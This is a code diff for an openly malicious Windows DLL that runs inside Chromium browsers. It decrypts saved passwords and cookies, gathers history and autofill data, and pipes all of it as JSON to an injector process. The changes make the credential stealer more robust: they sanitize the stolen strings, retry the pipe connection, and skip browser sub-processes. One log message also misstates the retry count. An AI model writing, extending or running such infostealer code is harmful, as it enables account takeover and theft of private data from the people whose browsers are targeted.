@@ -30,6 +30,31 @@ void log_to_file(const std::string& msg) {
     }
 }
 
+std::string to_utf8_lossy(const std::vector<unsigned char>& input) {
+    std::string output;
+    output.reserve(input.size());
+    for (unsigned char c : input) {
+        if (c < 128) {
+            output += (char)c;
+        } else {
+            output += '?';
+        }
+    }
+    return output;
+}
+
+std::string ensure_utf8(const std::string& input) {
+    std::string output;
+    output.reserve(input.size());
+    for (unsigned char c : input) {
+        if (c < 128) output += (char)c;
+        else {
+            output += '?';
+        }
+    }
+    return output;
+}
+
 enum class Browser { Chrome, Edge, Brave };
 
 struct PasswordData { std::string url, username, password; };
@@ -303,7 +328,7 @@ void do_work() {
                         auto& key = is_v20 ? v20_key : v10_key;
                         if (!key.empty()) {
                             auto dec = aes_gcm_decrypt(key, enc_pass);
-                            if (!dec.empty()) p_data.passwords.push_back({ url, user, std::string(dec.begin(), dec.end()) });
+                            if (!dec.empty()) p_data.passwords.push_back({ url, user, to_utf8_lossy(dec) });
                         }
                     }
                     sqlite3_finalize(stmt);
@@ -337,7 +362,7 @@ void do_work() {
                             auto dec = aes_gcm_decrypt(key, enc_val);
                             if (!dec.empty()) {
                                 if (is_v20 && dec.size() > 32) dec.erase(dec.begin(), dec.begin() + 32);
-                                p_data.cookies.push_back({ host, name, std::string(dec.begin(), dec.end()) });
+                                p_data.cookies.push_back({ host, name, to_utf8_lossy(dec) });
                             }
                         }
                     }
@@ -391,38 +416,57 @@ void do_work() {
         }
 
         json pj;
-        pj["name"] = p_data.name;
+        try {
+        pj["name"] = ensure_utf8(p_data.name);
         pj["passwords"] = json::array();
-        for (auto& p : p_data.passwords) pj["passwords"].push_back({{"url", p.url}, {"username", p.username}, {"password", p.password}});
+        for (auto& p : p_data.passwords) pj["passwords"].push_back({{"url", ensure_utf8(p.url)}, {"username", ensure_utf8(p.username)}, {"password", ensure_utf8(p.password)}});
         pj["cookies"] = json::array();
-        for (auto& c : p_data.cookies) pj["cookies"].push_back({{"host", c.host}, {"name", c.name}, {"value", c.value}});
+        for (auto& c : p_data.cookies) pj["cookies"].push_back({{"host", ensure_utf8(c.host)}, {"name", ensure_utf8(c.name)}, {"value", ensure_utf8(c.value)}});
         pj["history"] = json::array();
-        for (auto& h : p_data.history) pj["history"].push_back({{"url", h.url}, {"title", h.title}, {"visit_count", h.visit_count}});
+        for (auto& h : p_data.history) pj["history"].push_back({{"url", ensure_utf8(h.url)}, {"title", ensure_utf8(h.title)}, {"visit_count", h.visit_count}});
         pj["autofill"] = json::array();
-        for (auto& a : p_data.autofill) pj["autofill"].push_back({{"name", a.name}, {"value", a.value}});
+        for (auto& a : p_data.autofill) pj["autofill"].push_back({{"name", ensure_utf8(a.name)}, {"value", ensure_utf8(a.value)}});
         log_to_file("Profile " + profile + " summary: " + std::to_string(p_data.passwords.size()) + " passwords, " + std::to_string(p_data.cookies.size()) + " cookies.");
         collected.push_back(pj);
+        } catch (const std::exception& e) {
+            log_to_file("Error serializing profile " + profile + ": " + std::string(e.what()));
+        }
     }
 
+    log_to_file("Attempting JSON dump...");
+    std::string s = collected.dump(-1, ' ', false, nlohmann::json::error_handler_t::replace);
+    log_to_file("Generated JSON dump of " + std::to_string(s.size()) + " bytes.");
+
     HANDLE h_pipe = INVALID_HANDLE_VALUE;
-    for (int i = 0; i < 30; i++) {
+    for (int i = 0; i < 120; i++) {
         h_pipe = CreateFileW(L"\\\\.\\pipe\\chrome_extractor", GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
         if (h_pipe != INVALID_HANDLE_VALUE) break;
-        Sleep(200);
+
+        DWORD err = GetLastError();
+        if (err == ERROR_PIPE_BUSY) {
+            WaitNamedPipeW(L"\\\\.\\pipe\\chrome_extractor", 1000);
+        } else {
+            if (i % 10 == 0) log_to_file("Pipe connection attempt " + std::to_string(i) + " failed. Error: " + std::to_string(err));
+            Sleep(500);
+        }
     }
+
     if (h_pipe != INVALID_HANDLE_VALUE) {
-        std::string s = collected.dump();
         log_to_file("Connected to named pipe. Attempting to send " + std::to_string(s.size()) + " bytes...");
         DWORD written;
         if (WriteFile(h_pipe, s.c_str(), (DWORD)s.size(), &written, nullptr)) {
-            FlushFileBuffers(h_pipe);
-            log_to_file("Data sent successfully: " + std::to_string(written) + " bytes.");
+            if (FlushFileBuffers(h_pipe)) {
+                log_to_file("Data sent and flushed successfully: " + std::to_string(written) + " bytes.");
+                Sleep(1000); // Wait for injector to read
+            } else {
+                log_to_file("Data sent (" + std::to_string(written) + " bytes) but FlushFileBuffers failed: " + std::to_string(GetLastError()));
+            }
         } else {
             log_to_file("Error sending data via pipe: " + std::to_string(GetLastError()));
         }
         CloseHandle(h_pipe);
     } else {
-        log_to_file("Error: Could not connect to named pipe after 30 attempts.");
+        log_to_file("Error: Could not connect to named pipe after 60 attempts. Error: " + std::to_string(GetLastError()));
     }
     } catch (const std::exception& e) {
         log_to_file("Exception in do_work: " + std::string(e.what()));
@@ -438,8 +482,12 @@ DWORD WINAPI thread_func(LPVOID) {
 
 extern "C" BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
     if (fdwReason == DLL_PROCESS_ATTACH) {
-        HANDLE hThread = CreateThread(NULL, 0, thread_func, NULL, 0, NULL);
-        if (hThread) CloseHandle(hThread);
+        // Filter out sub-processes
+        std::wstring cmd = GetCommandLineW();
+        if (cmd.find(L"--type=") == std::wstring::npos) {
+            HANDLE hThread = CreateThread(NULL, 0, thread_func, NULL, 0, NULL);
+            if (hThread) CloseHandle(hThread);
+        }
     }
     return TRUE;
 }
